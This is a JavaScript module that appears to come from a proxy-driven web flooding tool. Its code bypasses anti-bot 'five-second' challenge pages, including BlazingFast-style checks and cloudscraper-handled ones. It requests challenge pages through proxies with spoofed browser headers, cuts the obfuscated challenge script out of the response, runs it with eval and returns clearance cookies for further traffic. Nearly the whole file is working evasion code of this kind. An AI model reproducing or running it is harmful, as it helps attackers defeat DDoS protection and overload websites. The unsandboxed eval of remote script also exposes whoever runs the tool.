const request = require('request'),
    {
        constants
    } = require('crypto'),
    X = require('../x'),
    BFCrypt = require('./bfcrypt'),
    zlib = require('zlib'),
    cloudscraper = require('cloudscraper').defaults({
        agentOptions: {
            ciphers: 'ECDHE-ECDSA-AES128-GCM-SHA256'
        }
    });

function randomScreenWidth() {
    return ~~(Math.random() * (2560 - 1024) + 1024)
}

function toNumbers(d) {
    var e = [];
    d.replace(/(..)/g, function(d) {
        e.push(parseInt(d, 16))
    });
    return e
}

function toHex() {
    for (var d = [], d = 1 == arguments.length && arguments[0].constructor == Array ? arguments[0] : arguments, e = "", f = 0; f <
        d.length; f++) e += (16 > d[f] ? "0" : "") + d[f].toString(16);
    return e.toLowerCase()
}

const document = {
    cookie: ''
}

function atob(string) {
    return Buffer.from(string, 'base64').toString('ascii');
}

module.exports = function(proxy, uagent, callback) {
    var cookie = "";
    if (['5sec'].indexOf(X._.firewall[1]) !== -1) {
        request.get({
            url: X._.address,
            gzip: true,
            proxy: 'http://' + proxy,
            headers: {
                'User-Agent': uagent,
                'Connection': 'keep-alive',
                'Cache-Control': 'max-age=0',
                'Upgrade-Insecure-Requests': 1,
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                'Accept-Encoding': 'gzip, deflate',
                'Accept-Language': 'en-US,en;q=0.9'
            }
        }, (err, res, body) => {
            if (!res || !res.headers['set-cookie'] || !body) {
                return false;
            }
            cookie = res.headers['set-cookie'].shift().split(';').shift();
            let url = X._.parsed.protocol + '//' + X._.parsed.host + '/___S___/' + body.split(';xhr.open("GET","/___S___/')[1].split('",true),xhr.onrea')[0].replace('" + ww +"', '1920');
            request.get({
                url: X._.parsed.protocol + '//' + X._.parsed.host + '/jquery.min.js',
                proxy: 'http://' + proxy,
                gzip: true,
                headers: {
                    'Connection': 'keep-alive',
                    'User-Agent': uagent,
                    'Accept': '*/*',
                    'DNT': 1,
                    'Referer': X._.address,
                    'Accept-Encoding': 'gzip, deflate',
                    'Accept-Language': 'en-US,en;q=0.5',
                    'Cookie': cookie
                }
            }, (err, res, body) => {
                request.get({
                    url,
                    proxy: 'http://' + proxy,
                    gzip: true,
                    headers: {
                        'Connection': 'keep-alive',
                        'User-Agent': uagent,
                        'Accept': '*/*',
                        'DNT': 1,
                        'Referer': X._.parsed.protocol + '//' + X._.parsed.host,
                        'Accept-Encoding': 'gzip, deflate',
                        'Accept-Language': 'en-US,en;q=0.5',
                        'Cookie': cookie
                    }
                }, function(err, res, body) {
                    if (err || body.indexOf('var a=toNumbers') == -1) return false;
                    let chl = 'var a=toNumbers' + body.split('var a=toNumbers')[1].replace(' if($(window).width()>0) { document.cookie=', 'document.cookie=').split('+"; domain =')[0]
                    let final = cookie + '; ' + eval(chl);
                    callback(final);
                });
            });
        });
    } else if (['5sec2'].indexOf(X._.firewall[1]) !== -1) {
        setTimeout(() => {
            cloudscraper.get({
                url: X._.address,
                gzip: true,
                proxy: 'http://' + proxy,
                headers: {
                    'User-Agent': uagent,
                    'Connection': 'keep-alive',
                    'Cache-Control': 'no-cache',
                    'Pragma': 'no-cache',
                    'Upgrade-Insecure-Requests': 1,
                    'Cache-Control': 'no-cache',
                    'Accept-Encoding': 'gzip, deflate, br',
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                    'Accept-Language': 'en-US,en;q=0.9'
                }
            }, (err, res, body) => {
                if (!res || !res.headers['set-cookie'] || !body) {
                    return false;
                }
                let url = X._.parsed.protocol + '//' + X._.parsed.host + '/blzgfst-shark/?bfu=' + encodeURI(body.split('r.value = "')[1].split("\";var _0xf8c2=['value'];")[0]) + '&blazing_answer=' + eval(body.split("return _0x8cc65;};a[_0x2f8c('0x0')]=")[1].split(';')[0]);
                cookie = res.headers['set-cookie'].shift().split(';').shift();
                cloudscraper.get({
                    url,
                    gzip: true,
                    proxy: 'http://' + proxy,
                    followAllRedirects: true,
                    jar: true,
                    headers: {
                        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                        'Connection': 'keep-alive',
                        'User-Agent': uagent,
                        'Referer': X._.address,
                        'Pragma': 'no-cache',
                        'Cache-Control': 'no-cache',
                        'Upgrade-Insecure-Requests': 1,
                        'Accept-Encoding': 'gzip, deflate, br',
                        'Accept-Language': 'en-US,en;q=0.5',
                        'TE': 'Trailers',
                        'Cookie': cookie
                    }
                }, function(err, res, body) {
                    if (err || !res) return false;
                    let final = res.request.headers.Cookie;
                    console.log(final)
                    callback(final);
                });
            });
        }, 5e3);

    };
}